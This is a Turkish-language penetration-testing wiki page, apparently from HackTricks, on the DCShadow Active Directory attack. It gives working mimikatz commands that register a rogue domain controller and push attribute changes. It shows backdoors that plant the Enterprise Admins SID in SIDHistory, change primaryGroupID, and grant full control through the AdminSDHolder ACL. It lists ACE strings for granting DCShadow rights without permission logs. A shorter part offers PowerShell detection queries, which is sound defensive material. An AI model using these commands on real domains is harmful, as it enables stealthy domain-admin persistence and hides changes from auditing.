# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

AD'ye bir **new Domain Controller** kaydeder ve belirtilen nesnelere (SIDHistory, SPNs...) üzerinde **push attributes** yapmak için kullanılır; yapılan **modifications** ile ilgili herhangi bir **logs** bırakmaz. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde olmanız gerekir.\
Yanlış veri kullanırsanız oldukça çirkin **logs** oluşacağını unutmayın.

Saldırıyı gerçekleştirmek için 2 mimikatz instance'ına ihtiyacınız var. Bunlardan biri, yapmak istediğiniz değişiklikleri belirteceğiniz şekilde SYSTEM ayrıcalıklarıyla RPC sunucularını başlatacak (burada gerçekleştirmek istediğiniz değişiklikleri belirtmelisiniz), diğer instance ise değerleri push etmek için kullanılacak:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Dikkat edin ki **`elevate::token`** `mimikatz1` oturumunda çalışmaz çünkü bu iş parçacığının ayrıcalıklarını yükseltir; ancak bizim yükseltmemiz gereken **işlemin ayrıcalıkları**.\
Ayrıca bir "LDAP" nesnesi de seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Değişiklikleri bir DA'dan veya aşağıdaki asgari izinlere sahip bir kullanıcıdan gönderebilirsiniz:

- **Etki alanı nesnesinde**:
- _DS-Install-Replica_ (Etki Alanında Replika Ekle/Kaldır)
- _DS-Replication-Manage-Topology_ (Replikasyon Topolojisini Yönetme)
- _DS-Replication-Synchronize_ (Replikasyon Senkronizasyonu)
- **Sites nesnesi** (ve alt öğeleri) **Yapılandırma kapsayıcısı** içinde:
- _CreateChild and DeleteChild_
- **DC olarak kaydedilmiş bilgisayarın** nesnesi:
- _WriteProperty_ (Write değil)
- **Hedef nesne**:
- _WriteProperty_ (Write değil)

Bu ayrıcalıkları yetkisiz bir kullanıcıya vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bunun bazı kayıtlar bırakacağını unutmayın). Bu, DA ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, kullanıcı adı _**student1**_ mcorp-student1 makinesinde oturum açtığında, _**root1user**_ nesnesi üzerinde DCShadow izinlerine sahip olduğu anlamına gelir.

## DCShadow kullanarak arka kapılar oluşturma
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Birincil grup suistimali, keşif boşlukları ve tespit

- `primaryGroupID` grup `member` listesinden ayrı bir özniteliktir. DCShadow/DSInternals bunu doğrudan yazabilir (ör. `primaryGroupID=512` olarak ayarlamak **Domain Admins** için) on-box LSASS denetimi olmadan, ancak AD yine de kullanıcıyı **taşır**: PGID'yi değiştirmek her zaman önceki birincil grubun üyeliğini kaldırır (herhangi bir hedef grup için aynı davranış), bu yüzden eski birincil grup üyeliğini koruyamazsınız.
- Varsayılan araçlar kullanıcıyı mevcut birincil grubundan kaldırmayı engeller (`ADUC`, `Remove-ADGroupMember`), bu yüzden PGID'yi değiştirmek genellikle doğrudan dizin yazımı gerektirir (DCShadow/`Set-ADDBPrimaryGroup`).
- Üyelik raporlaması tutarsızdır:
  - **İçerir** birincil grup kaynaklı üyeleri: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
  - **Hariç bırakır** birincil grup kaynaklı üyeleri: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
- Özyinelemeli kontroller, **birincil grubun kendisi iç içe (nested) olması** durumunda birincil grup üyelerini atlayabilir (ör. kullanıcı PGID'si Domain Admins içinde iç içe bir gruba işaret ediyorsa); `Get-ADGroupMember -Recursive` veya LDAP özyinelemeli filtreleri, özyineleme açıkça birincil grupları çözmezse o kullanıcıyı döndürmez.
- DACL hileleri: saldırganlar kullanıcıdaki `primaryGroupID` üzerine **deny ReadProperty** koyabilirler (veya non-AdminSDHolder gruplar için grup `member` özniteliği üzerinde), bu da etkili üyeliği çoğu PowerShell sorgusundan gizler; `net group` yine de üyeliği çözecektir. AdminSDHolder korumalı gruplar bu tür deny'leri sıfırlar.

Tespit/izleme örnekleri:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Ayrıcalıklı grupları, `Get-ADGroupMember` çıktısını `Get-ADGroup -Properties member` ile veya ADSI Edit ile karşılaştırarak `primaryGroupID` veya gizli özniteliklerin neden olduğu tutarsızlıkları yakalayın.

## Shadowception - DCShadow izinlerini DCShadow kullanarak verin (no modified permissions logs)

Sona kullanıcı SID'imizi ekleyerek aşağıdaki ACE'leri eklememiz gerekiyor:

- Domain nesnesinde:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Saldırgan bilgisayar nesnesinde: `(A;;WP;;;UserSID)`
- Hedef kullanıcı nesnesinde: `(A;;WP;;;UserSID)`
- Configuration container içindeki Sites nesnesinde: `(A;CI;CCDC;;;UserSID)`

Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Dikkat edin ki bu durumda **birden fazla değişiklik,** sadece bir tane değil. Bu yüzden **mimikatz1 oturumu** (RPC server) içinde yapmak istediğiniz her değişiklik için **`/stack` ile her değişiklik** parametresini kullanın. Bu şekilde, tüm bekleyen değişiklikleri rogue sunucuda uygulamak için sadece bir kez **`/push`** yapmanız yeterli olacaktır.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
